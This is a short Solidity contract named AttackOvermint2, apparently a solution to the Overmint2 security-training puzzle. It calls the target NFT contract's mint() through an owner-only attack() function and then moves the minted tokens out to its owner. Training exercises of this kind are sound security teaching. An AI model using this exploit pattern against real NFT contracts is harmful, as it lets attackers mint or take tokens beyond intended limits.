// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
import "@openzeppelin/contracts/utils/Address.sol";
import {Overmint2} from "./Overmint2.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";

contract AttackOvermint2 is Ownable2Step {
    Overmint2 public nftAddress;
    address public anotherOwner;

    constructor(address _nftAddress, address _anotherAddr) {
        nftAddress = Overmint2(_nftAddress);
        anotherOwner = _anotherAddr;
    }

    function attack() external onlyOwner {
        nftAddress.mint();
    }

    function transferNFTs(uint256 tokenId) external onlyOwner {
        nftAddress.transferFrom(address(this), msg.sender, tokenId);
    }
}
